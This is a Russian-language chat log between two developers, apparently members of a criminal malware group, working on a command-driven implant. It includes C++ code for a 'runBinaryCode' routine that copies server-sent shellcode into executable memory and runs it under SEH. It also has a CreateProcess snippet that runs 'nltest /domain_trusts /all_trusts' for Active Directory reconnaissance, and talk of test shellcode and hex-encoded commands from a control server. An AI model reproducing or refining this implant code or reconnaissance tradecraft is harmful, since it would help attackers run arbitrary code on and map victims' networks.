Timestamp	From	To	Message
2020-08-17 10:32:21.560385	price	mushroom	там произвольные значения могут быть
2020-08-17 10:32:30.433178	price	mushroom	сейчас х64 сделаю
2020-08-17 10:32:52.915039	price	mushroom	одновременно на консоль и в файл писать?
2020-08-17 10:33:00.498753	mushroom	price	Да.
2020-08-17 10:33:27.750907	mushroom	price	Это сделаешь когда все команды отладишь.
2020-08-17 10:33:54.296808	mushroom	price	Файл для тестера нужен.
2020-08-17 10:34:10.870613	price	mushroom	понятно
2020-08-17 10:34:25.502594	mushroom	price	Для себя как хочешь пиши отладочный вывод. Желательно его поподробнее писать.
2020-08-17 10:34:57.608847	price	mushroom	в выдаче отладки, что отмечать?
2020-08-17 10:35:35.456496	mushroom	price	Всё что тебе нужно чтобы быстро понять в чём и где ошибка в случае чего.
2020-08-17 10:36:38.086020	mushroom	price	Ход выполнения программы и по нему сразу поймёшь где ошибка произошла.
2020-08-17 10:40:30.978989	mushroom	price	По поводу nltest:
STARTUPINFO startupInfo = { 0 };
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS_INFORMATION procInfo = { 0 };
createProcess(NULL, tmpFilename, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, currDir, &startupInfo, &procInfo)
2020-08-17 10:40:50.687927	mushroom	price	Так тупо попробуй запустить.
2020-08-17 10:40:55.580223	price	mushroom	ok
2020-08-17 10:41:06.367226	mushroom	price	cmdline должно быть не const
2020-08-17 10:41:22.056149	mushroom	price	А у тебя const вроде.
2020-08-17 10:41:40.547624	price	mushroom	а другие почему стартуют?
2020-08-17 10:41:48.818920	mushroom	price	А нет ты сначала strcopy делаешь.
2020-08-17 10:41:56.475622	price	mushroom	я  про const видел в процессе выяснения
2020-08-17 10:47:53.368192	mushroom	price	Типа так:
STARTUPINFO startupInfo = { 0 };
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS_INFORMATION procInfo = { 0 };
cmd[] = TEXT("nltest /domain_trusts /all_trusts");
createProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &procInfo);
2020-08-17 10:48:54.192785	mushroom	price	Так должно запуститься. Потом ищи разницу у себя, почему не запускается.
2020-08-17 10:49:16.355253	price	mushroom	спасибо
2020-08-17 11:57:26.583073	price	mushroom	сейчас повнимательнее увидел, а кто придумал хекс код через пробел целый мегабайт пересылать?
2020-08-17 11:57:57.924523	price	mushroom	правильно ли это или можно пробелы не посылать?
2020-08-17 11:59:04.571554	mushroom	price	Можно без пробелов. Главное что 2 символа это один байт был.
2020-08-17 11:59:18.219286	price	mushroom	этото понятно
2020-08-17 11:59:47.672803	price	mushroom	просто пробел он же не сжимается и занимает пространство
2020-08-17 12:00:15.388766	mushroom	price	Это не критично.
2020-08-17 12:02:21.293506	price	mushroom	а вот ещё, когда делаешь повтор команды run code, сервер плодит номер команды перед скриптом.
2020-08-17 12:03:10.155547	price	mushroom	то есть посылает не просто скрипт , а номер команды и скрипт в скрипт
2020-08-17 12:03:18.628101	mushroom	price	17 %hexcode%
2020-08-17 12:03:29.857923	mushroom	price	Ну так и надо.
2020-08-17 12:03:36.471053	price	mushroom	нет, не сюда
2020-08-17 12:03:43.932832	price	mushroom	а в окошко
2020-08-17 12:03:47.238988	price	mushroom	на сервере
2020-08-17 12:04:05.905460	price	mushroom	не должно так, приходится все время стирать
2020-08-17 12:04:26.023169	mushroom	price	Это не наша проблема.
2020-08-17 13:35:06.022969	price	mushroom	Не удалось перечислить доверия домена: Status = 1722 0x6ba RPC_S_SERVER_UNAVAILABLE
2020-08-17 13:35:19.386978	price	mushroom	вот получилось извлечь
2020-08-17 13:35:42.136932	mushroom	price	Всё правильно.
2020-08-17 13:36:04.728462	price	mushroom	ну и все получено на х64 дебаг
2020-08-17 13:37:29.128389	mushroom	price	Хорошо.
2020-08-17 13:38:07.180632	price	mushroom	сейчас пойму почему не встраивалось, встрою и выложу
2020-08-17 13:38:52.922804	price	mushroom	пока трудился попутно шеллы запускать начал, простенькие типа 9090c3
2020-08-17 13:41:26.125138	mushroom	price	Там подстраховаться SEH.
2020-08-17 13:41:35.312416	mushroom	price	Главное.
2020-08-17 13:41:50.032562	price	mushroom	вот это -**па
2020-08-17 13:42:20.411727	price	mushroom	я всю ночь пытался встроить, все эти стековые регистрации знаю наизусть.
2020-08-17 13:43:11.904401	price	mushroom	без CRT практически не возможно, теоретически люди пишут что легко
2020-08-17 13:44:38.297807	price	mushroom	буду пробовать дальше
2020-08-17 13:45:29.911925	mushroom	price	Что без CRT не возможно?
2020-08-17 13:45:36.543147	price	mushroom	я весь NtosKrnl.lib  исползал на дебагере
2020-08-17 13:45:52.180850	price	mushroom	SEH exceptions  Конструкции try-except и try-finally без CRT
- you could use them if you implement _C_specific_handler (for 64-bit code) and _except_handler3 (for 32-bit code) functions. 
See simple expample how to do that by calling original C runtime functions in win32_crt_seh.cpp file.
Для  использования  конструкций блоков исключений и финализации следует позаботиться о наличии в программе процедуры, которую компилятор подставляет вместо реального хендлера: для x86-проектов это __except_handler3, а для x64 — __C_specific_handler. 
В этих процедурах производится собственная диспетчеризация: поиск и вызов необходимых хендлеров, а также раскрутка стека. 
Для х86-проекта можно просто подключить NtosKrnl.lib из директории C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x86,
для x64 -NtosKrnl.lib из директории C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64.
2020-08-17 13:46:09.945771	mushroom	price	Не парься с этим.
2020-08-17 13:46:27.234205	price	mushroom	чтобы был seh придется
2020-08-17 13:46:33.112059	mushroom	price	У меня так:
_Success_(return != 0)
BOOL Commander::runBinaryCode(_In_reads_bytes_(codeSize) LPCBYTE code, _In_ SIZE_T codeSize)
{
    PVOID codeAddr = kernel32.virtualAlloc(NULL, codeSize, MEM_COMMIT, PAGE_READWRITE);
    if (!codeAddr)
        return FALSE;

    DWORD err = ERROR_SUCCESS;
    CopyMemory(codeAddr, code, codeSize);
    DWORD old = 0;
    if (!kernel32.virtualProtect(codeAddr, codeSize, PAGE_EXECUTE, &old))
    {
        err = kernel32.getLastError();
        kernel32.virtualFree(codeAddr, codeSize, MEM_DECOMMIT);
        kernel32.setLastError(err);
        return FALSE;
    }

#ifdef _MSC_VER
    BOOL success = TRUE;
    __try
    {
        (*(VOID(*)())codeAddr)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
    }
#endif // _MSC_VER

    kernel32.virtualFree(codeAddr, codeSize, MEM_DECOMMIT);
    kernel32.setLastError(err);
#ifdef _MSC_VER
    return success;
#else
    return TRUE;
#endif // _MSC_VER
}
2020-08-17 13:46:52.632993	mushroom	price	Вот и весь SEH:
__try
   {
       (*(VOID(*)())codeAddr)();
   }
   __except (EXCEPTION_EXECUTE_HANDLER)
   {
       success = FALSE;
   }
2020-08-17 13:47:22.855213	price	mushroom	я попробую, но там дикие проблемы возникают
2020-08-17 13:47:32.295134	price	mushroom	либо ты знаешь, либо не пробовал
